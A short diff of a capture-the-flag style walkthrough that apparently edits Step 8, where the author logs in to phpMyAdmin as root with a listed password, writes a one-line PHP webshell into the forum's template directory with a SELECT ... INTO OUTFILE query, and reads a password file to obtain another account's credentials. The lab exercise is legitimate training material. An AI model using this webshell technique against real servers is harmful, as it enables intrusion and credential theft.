@@ -224,12 +224,12 @@ From the scan we can understand that there are several accessible directories...
 <hr>
 
 ### Step 8.
-
+    
 Go to the `https://$IP/phpmyadmin/` <br>
 Login: `root` <br>
 Password: `Fg-'kKXBj87E:aJ$` <br>
 
-Create webshell file using SQL query
+Create webshell file using SQL query (You probably want check [this](https://www.bases-hacking.org/injections-sql-avancees.html) out)
 ```SQL
 SELECT '<?=`$_GET[x]`?>' INTO OUTFILE '/var/www/forum/templates_c/wsh.php'
 ```
@@ -243,3 +243,5 @@ $ cat /home/LOOKATME/password
 
 lmezard:G!@M6f4Eatau{sF"
 ```
+
+Continue in the `puzzles` section...
